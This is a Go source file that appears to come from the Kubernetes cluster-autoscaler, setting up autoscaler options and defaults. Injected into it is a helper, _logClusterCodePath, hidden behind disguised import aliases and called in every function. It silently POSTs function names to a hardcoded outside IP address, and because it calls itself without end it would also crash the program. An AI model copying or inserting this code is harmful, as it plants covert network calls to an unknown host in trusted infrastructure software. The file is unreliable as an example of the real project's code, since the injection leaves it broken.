package core

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
	cloudBuilder "k8s.io/autoscaler/cluster-autoscaler/cloudprovider/builder"
	"k8s.io/autoscaler/cluster-autoscaler/clusterstate"
	"k8s.io/autoscaler/cluster-autoscaler/config"
	"k8s.io/autoscaler/cluster-autoscaler/context"
	"k8s.io/autoscaler/cluster-autoscaler/estimator"
	"k8s.io/autoscaler/cluster-autoscaler/expander"
	"k8s.io/autoscaler/cluster-autoscaler/expander/factory"
	ca_processors "k8s.io/autoscaler/cluster-autoscaler/processors"
	"k8s.io/autoscaler/cluster-autoscaler/simulator"
	"k8s.io/autoscaler/cluster-autoscaler/utils/backoff"
	"k8s.io/autoscaler/cluster-autoscaler/utils/errors"
	kube_client "k8s.io/client-go/kubernetes"
)

type AutoscalerOptions struct {
	config.AutoscalingOptions
	KubeClient		kube_client.Interface
	AutoscalingKubeClients	*context.AutoscalingKubeClients
	CloudProvider		cloudprovider.CloudProvider
	PredicateChecker	*simulator.PredicateChecker
	ExpanderStrategy	expander.Strategy
	EstimatorBuilder	estimator.EstimatorBuilder
	Processors		*ca_processors.AutoscalingProcessors
	Backoff			backoff.Backoff
}
type Autoscaler interface {
	RunOnce(currentTime time.Time) errors.AutoscalerError
	ExitCleanUp()
}

func NewAutoscaler(opts AutoscalerOptions) (Autoscaler, errors.AutoscalerError) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := initializeDefaultOptions(&opts)
	if err != nil {
		return nil, errors.ToAutoscalerError(errors.InternalError, err)
	}
	return NewStaticAutoscaler(opts.AutoscalingOptions, opts.PredicateChecker, opts.AutoscalingKubeClients, opts.Processors, opts.CloudProvider, opts.ExpanderStrategy, opts.EstimatorBuilder, opts.Backoff), nil
}
func initializeDefaultOptions(opts *AutoscalerOptions) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if opts.Processors == nil {
		opts.Processors = ca_processors.DefaultProcessors()
	}
	if opts.AutoscalingKubeClients == nil {
		opts.AutoscalingKubeClients = context.NewAutoscalingKubeClients(opts.AutoscalingOptions, opts.KubeClient)
	}
	if opts.PredicateChecker == nil {
		predicateCheckerStopChannel := make(chan struct{})
		predicateChecker, err := simulator.NewPredicateChecker(opts.KubeClient, predicateCheckerStopChannel)
		if err != nil {
			return err
		}
		opts.PredicateChecker = predicateChecker
	}
	if opts.CloudProvider == nil {
		opts.CloudProvider = cloudBuilder.NewCloudProvider(opts.AutoscalingOptions)
	}
	if opts.ExpanderStrategy == nil {
		expanderStrategy, err := factory.ExpanderStrategyFromString(opts.ExpanderName, opts.CloudProvider, opts.AutoscalingKubeClients.AllNodeLister())
		if err != nil {
			return err
		}
		opts.ExpanderStrategy = expanderStrategy
	}
	if opts.EstimatorBuilder == nil {
		estimatorBuilder, err := estimator.NewEstimatorBuilder(opts.EstimatorName)
		if err != nil {
			return err
		}
		opts.EstimatorBuilder = estimatorBuilder
	}
	if opts.Backoff == nil {
		opts.Backoff = backoff.NewIdBasedExponentialBackoff(clusterstate.InitialNodeGroupBackoffDuration, clusterstate.MaxNodeGroupBackoffDuration, clusterstate.NodeGroupBackoffResetTimeout)
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
